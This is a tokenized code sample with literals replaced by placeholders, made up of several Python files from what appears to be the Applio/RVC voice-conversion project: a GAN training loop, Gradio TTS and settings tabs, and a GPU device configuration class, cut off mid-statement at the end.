spec , spec_lengths , wave , wave_lengths , sid = info <EOL> if ( hps . if_cache_data_in_gpu == False ) and torch . cuda . is_available ( ) : <EOL> phone = phone . cuda ( rank , non_blocking = True ) <EOL> phone_lengths = phone_lengths . cuda ( rank , non_blocking = True ) <EOL> if hps . if_f0 == <NUM_LIT> : <EOL> pitch = pitch . cuda ( rank , non_blocking = True ) <EOL> pitchf = pitchf . cuda ( rank , non_blocking = True ) <EOL> sid = sid . cuda ( rank , non_blocking = True ) <EOL> spec = spec . cuda ( rank , non_blocking = True ) <EOL> spec_lengths = spec_lengths . cuda ( rank , non_blocking = True ) <EOL> wave = wave . cuda ( rank , non_blocking = True ) <EOL> with autocast ( enabled = hps . train . fp16_run ) : <EOL> if hps . if_f0 == <NUM_LIT> : <EOL> ( <EOL> y_hat , <EOL> ids_slice , <EOL> x_mask , <EOL> z_mask , <EOL> ( z , z_p , m_p , logs_p , m_q , logs_q ) , <EOL> ) = net_g ( phone , phone_lengths , pitch , pitchf , spec , spec_lengths , sid ) <EOL> else : <EOL> ( <EOL> y_hat , <EOL> ids_slice , <EOL> x_mask , <EOL> z_mask , <EOL> ( z , z_p , m_p , logs_p , m_q , logs_q ) , <EOL> ) = net_g ( phone , phone_lengths , spec , spec_lengths , sid ) <EOL> mel = spec_to_mel_torch ( <EOL> spec , <EOL> hps . data . filter_length , <EOL> hps . data . n_mel_channels , <EOL> hps . data . sampling_rate , <EOL> hps . data . mel_fmin , <EOL> hps . data . mel_fmax , <EOL> ) <EOL> y_mel = commons . slice_segments ( <EOL> mel , ids_slice , hps . train . segment_size // hps . data . hop_length <EOL> ) <EOL> with autocast ( enabled = False ) : <EOL> y_hat_mel = mel_spectrogram_torch ( <EOL> y_hat . float ( ) . squeeze ( <NUM_LIT> ) , <EOL> hps . data . filter_length , <EOL> hps . data . n_mel_channels , <EOL> hps . data . sampling_rate , <EOL> hps . data . hop_length , <EOL> hps . data . win_length , <EOL> hps . data . mel_fmin , <EOL> hps . data . mel_fmax , <EOL> ) <EOL> if hps . train . fp16_run == True : <EOL> y_hat_mel = y_hat_mel . half ( ) <EOL> wave = commons . slice_segments ( <EOL> wave , ids_slice * hps . data . hop_length , hps . train . segment_size <EOL> ) <EOL> y_d_hat_r , y_d_hat_g , _ , _ = net_d ( wave , y_hat . detach ( ) ) <EOL> with autocast ( enabled = False ) : <EOL> loss_disc , losses_disc_r , losses_disc_g = discriminator_loss ( <EOL> y_d_hat_r , y_d_hat_g <EOL> ) <EOL> optim_d . zero_grad ( ) <EOL> scaler . scale ( loss_disc ) . backward ( ) <EOL> scaler . unscale_ ( optim_d ) <EOL> grad_norm_d = commons . clip_grad_value_ ( net_d . parameters ( ) , None ) <EOL> scaler . step ( optim_d ) <EOL> with autocast ( enabled = hps . train . fp16_run ) : <EOL> y_d_hat_r , y_d_hat_g , fmap_r , fmap_g = net_d ( wave , y_hat ) <EOL> with autocast ( enabled = False ) : <EOL> loss_mel = F . l1_loss ( y_mel , y_hat_mel ) * hps . train . c_mel <EOL> loss_kl = kl_loss ( z_p , logs_q , m_p , logs_p , z_mask ) * hps . train . c_kl <EOL> loss_fm = feature_loss ( fmap_r , fmap_g ) <EOL> loss_gen , losses_gen = generator_loss ( y_d_hat_g ) <EOL> loss_gen_all = loss_gen + loss_fm + loss_mel + loss_kl <EOL> if loss_gen_all < lowest_value [ "<STR_LIT>" ] : <EOL> lowest_value [ "<STR_LIT>" ] = loss_gen_all <EOL> lowest_value [ "<STR_LIT>" ] = global_step <EOL> lowest_value [ "<STR_LIT>" ] = epoch <EOL> if epoch > lowest_value [ "<STR_LIT>" ] : <EOL> print ( <EOL> "<STR_LIT>" <EOL> ) <EOL> optim_g . zero_grad ( ) <EOL> scaler . scale ( loss_gen_all ) . backward ( ) <EOL> scaler . unscale_ ( optim_g ) <EOL> grad_norm_g = commons . clip_grad_value_ ( net_g . parameters ( ) , None ) <EOL> scaler . step ( optim_g ) <EOL> scaler . update ( ) <EOL> if rank == <NUM_LIT> : <EOL> if global_step % hps . train . log_interval == <NUM_LIT> : <EOL> lr = optim_g . param_groups [ <NUM_LIT> ] [ "<STR_LIT>" ] <EOL> if loss_mel > <NUM_LIT> : <EOL> loss_mel = <NUM_LIT> <EOL> if loss_kl > <NUM_LIT> : <EOL> loss_kl = <NUM_LIT> <EOL> scalar_dict = { <EOL> "<STR_LIT>" : loss_gen_all , <EOL> "<STR_LIT>" : loss_disc , <EOL> "<STR_LIT>" : lr , <EOL> "<STR_LIT>" : grad_norm_d , <EOL> "<STR_LIT>" : grad_norm_g , <EOL> } <EOL> scalar_dict . update ( <EOL> { <EOL> "<STR_LIT>" : loss_fm , <EOL> "<STR_LIT>" : loss_mel , <EOL> "<STR_LIT>" : loss_kl , <EOL> } <EOL> ) <EOL> scalar_dict . update ( <EOL> { "<STR_LIT>" . format ( i ) : v for i , v in enumerate ( losses_gen ) } <EOL> ) <EOL> scalar_dict . update ( <EOL> { "<STR_LIT>" . format ( i ) : v for i , v in enumerate ( losses_disc_r ) } <EOL> ) <EOL> scalar_dict . update ( <EOL> { "<STR_LIT>" . format ( i ) : v for i , v in enumerate ( losses_disc_g ) } <EOL> ) <EOL> image_dict = { <EOL> "<STR_LIT>" : plot_spectrogram_to_numpy ( <EOL> y_mel [ <NUM_LIT> ] . data . cpu ( ) . numpy ( ) <EOL> ) , <EOL> "<STR_LIT>" : plot_spectrogram_to_numpy ( <EOL> y_hat_mel [ <NUM_LIT> ] . data . cpu ( ) . numpy ( ) <EOL> ) , <EOL> "<STR_LIT>" : plot_spectrogram_to_numpy ( mel [ <NUM_LIT> ] . data . cpu ( ) . numpy ( ) ) , <EOL> } <EOL> summarize ( <EOL> writer = writer , <EOL> global_step = global_step , <EOL> images = image_dict , <EOL> scalars = scalar_dict , <EOL> ) <EOL> global_step += <NUM_LIT> <EOL> if epoch % hps . save_every_epoch == <NUM_LIT> and rank == <NUM_LIT> : <EOL> checkpoint_suffix = "<STR_LIT>" . format ( <EOL> global_step if hps . if_latest == <NUM_LIT> else <NUM_LIT> <EOL> ) <EOL> save_checkpoint ( <EOL> net_g , <EOL> optim_g , <EOL> hps . train . learning_rate , <EOL> epoch , <EOL> os . path . join ( hps . model_dir , "<STR_LIT>" + checkpoint_suffix ) , <EOL> ) <EOL> save_checkpoint ( <EOL> net_d , <EOL> optim_d , <EOL> hps . train . learning_rate , <EOL> epoch , <EOL> os . path . join ( hps . model_dir , "<STR_LIT>" + checkpoint_suffix ) , <EOL> ) <EOL> if rank == <NUM_LIT> and hps . save_every_weights == "<STR_LIT>" : <EOL> if hasattr ( net_g , "<STR_LIT>" ) : <EOL> ckpt = net_g . module . state_dict ( ) <EOL> else : <EOL> ckpt = net_g . state_dict ( ) <EOL> extract_model ( <EOL> ckpt , <EOL> hps . sample_rate , <EOL> hps . if_f0 , <EOL> hps . name , <EOL> os . path . join ( <EOL> hps . model_dir , "<STR_LIT>" . format ( hps . name , epoch , global_step ) <EOL> ) , <EOL> epoch , <EOL> global_step , <EOL> hps . version , <EOL> hps , <EOL> ) <EOL> if hps . overtraining_detector == <NUM_LIT> : <EOL> if lowest_value [ "<STR_LIT>" ] < last_loss_gen_all : <EOL> epochs_since_last_lowest += <NUM_LIT> <EOL> else : <EOL> epochs_since_last_lowest = <NUM_LIT> <EOL> if epochs_since_last_lowest >= hps . overtraining_threshold : <EOL> print ( <EOL> "<STR_LIT>" . format ( <EOL> lowest_value [ "<STR_LIT>" ] , lowest_value [ "<STR_LIT>" ] , lowest_value [ "<STR_LIT>" ] <EOL> ) <EOL> ) <EOL> os . _exit ( <NUM_LIT> ) <EOL> if rank == <NUM_LIT> : <EOL> if epoch > <NUM_LIT> : <EOL> print ( hps . overtraining_threshold ) <EOL> print ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> else : <EOL> print ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> last_loss_gen_all = loss_gen_all <EOL> if epoch >= hps . total_epoch and rank == <NUM_LIT> : <EOL> print ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> print ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> pid_file_path = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> os . remove ( pid_file_path ) <EOL> if hasattr ( net_g , "<STR_LIT>" ) : <EOL> ckpt = net_g . module . state_dict ( ) <EOL> else : <EOL> ckpt = net_g . state_dict ( ) <EOL> extract_model ( <EOL> ckpt , <EOL> hps . sample_rate , <EOL> hps . if_f0 , <EOL> hps . name , <EOL> os . path . join ( <EOL> hps . model_dir , "<STR_LIT>" . format ( hps . name , epoch , global_step ) <EOL> ) , <EOL> epoch , <EOL> global_step , <EOL> hps . version , <EOL> hps , <EOL> ) <EOL> sleep ( <NUM_LIT> ) <EOL> os . _exit ( <NUM_LIT> ) <EOL> if __name__ == "<STR_LIT>" : <EOL> torch . multiprocessing . set_start_method ( "<STR_LIT>" ) <EOL> main ( ) <EOL> </s>
<s> import os , sys <EOL> import gradio as gr <EOL> import regex as re <EOL> import json <EOL> import random <EOL> from core import ( <EOL> run_tts_script , <EOL> ) <EOL> from assets . i18n . i18n import I18nAuto <EOL> i18n = I18nAuto ( ) <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> model_root = os . path . join ( now_dir , "<STR_LIT>" ) <EOL> model_root_relative = os . path . relpath ( model_root , now_dir ) <EOL> names = [ <EOL> os . path . join ( root , file ) <EOL> for root , _ , files in os . walk ( model_root_relative , topdown = False ) <EOL> for file in files <EOL> if ( <EOL> file . endswith ( ( "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> and not ( file . startswith ( "<STR_LIT>" ) or file . startswith ( "<STR_LIT>" ) ) <EOL> ) <EOL> ] <EOL> indexes_list = [ <EOL> os . path . join ( root , name ) <EOL> for root , _ , files in os . walk ( model_root_relative , topdown = False ) <EOL> for name in files <EOL> if name . endswith ( "<STR_LIT>" ) and "<STR_LIT>" not in name <EOL> ] <EOL> def change_choices ( ) : <EOL> names = [ <EOL> os . path . join ( root , file ) <EOL> for root , _ , files in os . walk ( model_root_relative , topdown = False ) <EOL> for file in files <EOL> if ( <EOL> file . endswith ( ( "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> and not ( file . startswith ( "<STR_LIT>" ) or file . startswith ( "<STR_LIT>" ) ) <EOL> ) <EOL> ] <EOL> indexes_list = [ <EOL> os . path . join ( root , name ) <EOL> for root , _ , files in os . walk ( model_root_relative , topdown = False ) <EOL> for name in files <EOL> if name . endswith ( "<STR_LIT>" ) and "<STR_LIT>" not in name <EOL> ] <EOL> return ( <EOL> { "<STR_LIT>" : sorted ( names ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : sorted ( indexes_list ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> def get_indexes ( ) : <EOL> indexes_list = [ <EOL> os . path . join ( dirpath , filename ) <EOL> for dirpath , _ , filenames in os . walk ( model_root_relative ) <EOL> for filename in filenames <EOL> if filename . endswith ( "<STR_LIT>" ) and "<STR_LIT>" not in filename <EOL> ] <EOL> return indexes_list if indexes_list else "<STR_LIT>" <EOL> def process_input ( file_path ) : <EOL> with open ( file_path , "<STR_LIT>" ) as file : <EOL> file_contents = file . read ( ) <EOL> gr . Info ( f"<STR_LIT>" ) <EOL> return file_contents , None <EOL> def match_index ( model_file_value ) : <EOL> if model_file_value : <EOL> model_folder = os . path . dirname ( model_file_value ) <EOL> index_files = get_indexes ( ) <EOL> for index_file in index_files : <EOL> if os . path . dirname ( index_file ) == model_folder : <EOL> return index_file <EOL> return "<STR_LIT>" <EOL> def tts_tab ( ) : <EOL> default_weight = random . choice ( names ) if names else "<STR_LIT>" <EOL> with gr . Row ( ) : <EOL> with gr . Row ( ) : <EOL> model_file = gr . Dropdown ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = sorted ( names , key = lambda path : os . path . getsize ( path ) ) , <EOL> interactive = True , <EOL> value = default_weight , <EOL> allow_custom_value = True , <EOL> ) <EOL> best_default_index_path = match_index ( model_file . value ) <EOL> index_file = gr . Dropdown ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = get_indexes ( ) , <EOL> value = best_default_index_path , <EOL> interactive = True , <EOL> allow_custom_value = True , <EOL> ) <EOL> with gr . Column ( ) : <EOL> refresh_button = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> unload_button = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> unload_button . click ( <EOL> fn = lambda : ( <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) , <EOL> inputs = [ ] , <EOL> outputs = [ model_file , index_file ] , <EOL> ) <EOL> model_file . select ( <EOL> fn = lambda model_file_value : match_index ( model_file_value ) , <EOL> inputs = [ model_file ] , <EOL> outputs = [ index_file ] , <EOL> ) <EOL> json_path = os . path . join ( "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> with open ( json_path , "<STR_LIT>" ) as file : <EOL> tts_voices_data = json . load ( file ) <EOL> short_names = [ voice . get ( "<STR_LIT>" , "<STR_LIT>" ) for voice in tts_voices_data ] <EOL> tts_voice = gr . Dropdown ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = short_names , <EOL> interactive = True , <EOL> value = None , <EOL> ) <EOL> tts_text = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> placeholder = i18n ( "<STR_LIT>" ) , <EOL> lines = <NUM_LIT> , <EOL> ) <EOL> txt_file = gr . File ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> type = "<STR_LIT>" , <EOL> ) <EOL> with gr . Accordion ( i18n ( "<STR_LIT>" ) , open = False ) : <EOL> with gr . Column ( ) : <EOL> output_tts_path = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> placeholder = i18n ( "<STR_LIT>" ) , <EOL> value = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) , <EOL> interactive = True , <EOL> ) <EOL> output_rvc_path = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> placeholder = i18n ( "<STR_LIT>" ) , <EOL> value = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) , <EOL> interactive = True , <EOL> ) <EOL> export_format = gr . Radio ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> ) <EOL> split_audio = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = True , <EOL> value = False , <EOL> interactive = True , <EOL> ) <EOL> autotune = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = True , <EOL> value = False , <EOL> interactive = True , <EOL> ) <EOL> clean_audio = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = True , <EOL> value = True , <EOL> interactive = True , <EOL> ) <EOL> clean_strength = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = True , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> pitch = gr . Slider ( <EOL> minimum = - <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> step = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> filter_radius = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> step = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> index_rate = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> rms_mix_rate = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> protect = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> hop_length = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> step = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> with gr . Column ( ) : <EOL> f0method = gr . Radio ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> choices = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> ) <EOL> convert_button1 = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> with gr . Row ( ) : <EOL> vc_output1 = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> ) <EOL> vc_output2 = gr . Audio ( label = i18n ( "<STR_LIT>" ) ) <EOL> def toggle_visible ( checkbox ) : <EOL> return { "<STR_LIT>" : checkbox , "<STR_LIT>" : "<STR_LIT>" } <EOL> clean_audio . change ( <EOL> fn = toggle_visible , <EOL> inputs = [ clean_audio ] , <EOL> outputs = [ clean_strength ] , <EOL> ) <EOL> refresh_button . click ( <EOL> fn = change_choices , <EOL> inputs = [ ] , <EOL> outputs = [ model_file , index_file ] , <EOL> ) <EOL> txt_file . upload ( <EOL> fn = process_input , <EOL> inputs = [ txt_file ] , <EOL> outputs = [ tts_text , txt_file ] , <EOL> ) <EOL> convert_button1 . click ( <EOL> fn = run_tts_script , <EOL> inputs = [ <EOL> tts_text , <EOL> tts_voice , <EOL> pitch , <EOL> filter_radius , <EOL> index_rate , <EOL> rms_mix_rate , <EOL> protect , <EOL> hop_length , <EOL> f0method , <EOL> output_tts_path , <EOL> output_rvc_path , <EOL> model_file , <EOL> index_file , <EOL> split_audio , <EOL> autotune , <EOL> clean_audio , <EOL> clean_strength , <EOL> export_format , <EOL> ] , <EOL> outputs = [ vc_output1 , vc_output2 ] , <EOL> ) <EOL> </s>
<s> import os , sys <EOL> import torch <EOL> import json <EOL> import gradio as gr <EOL> from assets . i18n . i18n import I18nAuto <EOL> from tabs . settings . restart import restart_applio <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> i18n = I18nAuto ( ) <EOL> ngpu = torch . cuda . device_count ( ) <EOL> config_file = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" ) <EOL> def gpu_available ( ) : <EOL> if torch . cuda . is_available ( ) or ngpu != <NUM_LIT> : <EOL> return True <EOL> def load_fake_gpu ( ) : <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> config = json . load ( file ) <EOL> return config [ "<STR_LIT>" ] <EOL> def save_config ( value ) : <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> config = json . load ( file ) <EOL> config [ "<STR_LIT>" ] = value <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> json . dump ( config , file , indent = <NUM_LIT> ) <EOL> def fake_gpu_tab ( ) : <EOL> with gr . Row ( ) : <EOL> with gr . Column ( ) : <EOL> presence = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> interactive = True , <EOL> value = load_fake_gpu ( ) , <EOL> ) <EOL> presence . change ( <EOL> fn = toggle , <EOL> inputs = [ presence ] , <EOL> outputs = [ ] , <EOL> ) <EOL> def toggle ( checkbox ) : <EOL> save_config ( bool ( checkbox ) ) <EOL> restart_applio ( ) <EOL> </s>
<s> import torch <EOL> import json <EOL> import os <EOL> version_config_list = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> def singleton_variable ( func ) : <EOL> def wrapper ( * args , ** kwargs ) : <EOL> if not wrapper . instance : <EOL> wrapper . instance = func ( * args , ** kwargs ) <EOL> return wrapper . instance <EOL> wrapper . instance = None <EOL> return wrapper <EOL> @ singleton_variable <EOL> class Config : <EOL> def __init__ ( self ) : <EOL> self . device = "<STR_LIT>" <EOL> self . is_half = True <EOL> self . use_jit = False <EOL> self . n_cpu = <NUM_LIT> <EOL> self . gpu_name = None <EOL> self . json_config = self . load_config_json ( ) <EOL> self . gpu_mem = None <EOL> self . instead = "<STR_LIT>" <EOL> self . x_pad , self . x_query , self . x_center , self . x_max = self . device_config ( ) <EOL> @ staticmethod <EOL> def load_config_json ( ) -> dict : <EOL> d = { } <EOL> for config_file in version_config_list : <EOL> with open ( f"<STR_LIT>" , "<STR_LIT>" ) as f : <EOL> d [ config_file ] = json . load ( f ) <EOL> return d <EOL> @ staticmethod <EOL> def has_mps ( ) -> bool : <EOL> if not torch . backends . mps . is_available ( ) : <EOL> return False <EOL> try : <EOL> torch . zeros ( <NUM_LIT> ) . to ( torch . device ( "<STR_LIT>" ) ) <EOL> return True <EOL> except Exception : <EOL> return False <EOL> @ staticmethod <EOL> def has_xpu ( ) -> bool : <EOL> if hasattr ( torch , "<STR_LIT>" ) and torch . xpu . is_available ( ) : <EOL> return True <EOL> else : <EOL> return False <EOL> def use_fp32_config ( self ) : <EOL> print ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> for config_file in version_config_list : <EOL> self . json_config [ config_file ] [ "<STR_LIT>" ] [ "<STR_LIT>" ] = False <EOL> with open ( f"<STR_LIT>" , "<STR_LIT>" ) as f : <EOL> strr = f . read ( ) . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> with open ( f"<STR_LIT>" , "<STR_LIT>" ) as f : <EOL> f . write ( strr ) <EOL> with open ( "<STR_LIT>" , "<STR_LIT>" ) as f : <EOL> strr = f . read ( ) . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> with open ( "<STR_LIT>" , "<STR_LIT>" ) as f : <EOL> f . write ( strr ) <EOL> def device_config ( self ) -> tuple : <EOL> if torch . cuda . is_available ( ) : <EOL> if self . has_xpu ( ) : <EOL> self . device = self . instead = "<STR_LIT>" <EOL> self . is_half = True <EOL> i_device = int ( self . device . split ( "<STR_LIT>" ) [ - <NUM_LIT> ] ) <EOL> self . gpu_name = torch . cuda . get_device_name ( i_device ) <EOL> if ( <EOL> ( "<STR_LIT>" in self . gpu_name and "<STR_LIT>" not in self . gpu_name . upper ( ) ) <EOL> or "<STR_LIT>" in self . gpu_name . upper ( ) <EOL> or "<STR_LIT>" in self . gpu_name . upper ( ) <EOL> or "<STR_LIT>" in self . gpu_name <EOL> or "<STR_LIT>" in self . gpu_name <EOL> or "<STR_LIT>" in self . gpu_name <EOL> ) : <EOL> self . is_half = False <EOL> self . use_fp32_config ( ) <EOL> self . gpu_mem = int ( <EOL> torch . cuda . get_device_properties ( i_device ) . total_memory <EOL> / <NUM_LIT> <EOL> / <NUM_LIT> <EOL> / <NUM_LIT> <EOL> + <NUM_LIT> <EOL> ) <EOL> if self . gpu_mem <= <NUM_LIT> : <EOL> with open ( "<STR_LIT>" , "<STR_LIT>" ) as f : <EOL> strr = f . read ( ) . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> with open ( "<STR_LIT>" , "<STR_LIT>" ) as f : <EOL> f . write ( strr ) <EOL> elif self . has_mps ( ) : <EOL> print ( "<STR_LIT>" ) <EOL> self . device = self . instead = "<STR_LIT>" <EOL> self . is_half = False <EOL> self . use_fp32_config ( ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> self . device = self . instead = "<STR_LIT>" <EOL> self . is_half = False <EOL> self . use_fp32_config ( ) <EOL> if self . n_cpu == <NUM_LIT> : <EOL> self . n_cpu = os . cpu_count ( ) <EOL> if self . is_half : <EOL> x_pad = <NUM_LIT> <EOL> x_query = <NUM_LIT> <EOL> x_center = <NUM_LIT> <EOL> x_max = <NUM_LIT> <EOL> else : <EOL> x_pad = <NUM_LIT> <EOL> x_query = <NUM_LIT> <EOL> x_center = <NUM_LIT> <EOL> x_max = <NUM_LIT> <EOL> if self . gpu_mem is not None and self . gpu_mem <= <NUM_LIT> : <EOL> x_pad = <NUM_LIT> <EOL> x_query = <NUM_LIT> <EOL> x_center = <NUM_LIT> <EOL> x_max = <NUM_LIT> <EOL> return x_pad , x_query , x_center , x_max <EOL> def max_vram_gpu ( gpu ) : <EOL> if torch . cuda . is_available ( ) : <EOL> gpu_properties = torch . cuda . get_device_properties ( gpu ) <EOL> total_memory_gb = round ( gpu_properties . total_memory / <NUM_LIT> / <NUM_LIT> / <NUM_LIT> ) <EOL> return total_memory_gb <EOL> else : <EOL> return "<STR_LIT>" <EOL> def get_gpu_info ( ) : <EOL> ngpu = torch . cuda . device_count ( ) <EOL> gpu_infos = [ ] <EOL> if torch . cuda . is_available ( ) or ngpu != <NUM_LIT> : <EOL> for i in range ( ngpu ) : <EOL> gpu_name = torch . cuda . get_device_name ( i ) <EOL> mem = int ( <EOL> torch . cuda . get_device_properties ( i ) . total_memory / <NUM_LIT> / <NUM_LIT> / <NUM_LIT> <EOL> + <NUM_LIT> <EOL> ) <EOL> gpu_infos . append ( "<STR_LIT>" % ( i , gpu_name , mem ) ) <EOL> if len ( gpu_infos ) > <NUM_LIT> : <EOL> gpu_info = "<STR_LIT>" . join ( gpu_infos ) <EOL> else : <EOL> gpu_info = "<STR_LIT>" <EOL> return gpu_info <EOL> </s>
<s> import os <EOL> import subprocess <EOL> import sys <EOL> import shutil <EOL> import gradio as gr <EOL> from assets . i18n . i18n import I18nAuto <EOL> from core import ( <EOL> run_preprocess_script , <EOL> run_extract_script , <EOL> run_train_script , <EOL> run_index_script , <EOL> run_prerequisites_script , <EOL> ) <EOL> from rvc . configs . config import max_vram_gpu , get_gpu_info <EOL> from rvc . lib . utils import format_title <EOL> from tabs . settings . restart import restart_applio <EOL> i18n = I18nAuto ( ) <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> pretraineds_v1 = [ <EOL> ( <EOL> "<STR_LIT>" , <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] , <EOL> ) , <EOL> ] <EOL> folder_mapping = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> sup_audioext = { <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> } <EOL> pretraineds_custom_path = os . path . join ( <EOL> now_dir , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" <EOL> ) <EOL> pretraineds_custom_path_relative = os . path . relpath ( pretraineds_custom_path , now_dir ) <EOL> if not os . path . exists ( pretraineds_custom_path_relative ) : <EOL> os . makedirs ( pretraineds_custom_path_relative ) <EOL> def get_pretrained_list ( suffix ) : <EOL> return [ <EOL> os . path . join ( dirpath , filename ) <EOL> for dirpath , _ , filenames in os . walk ( pretraineds_custom_path_relative ) <EOL> for filename in filenames <EOL> if filename . endswith ( "<STR_LIT>" ) and suffix in filename <EOL> ] <EOL> pretraineds_list_d = get_pretrained_list ( 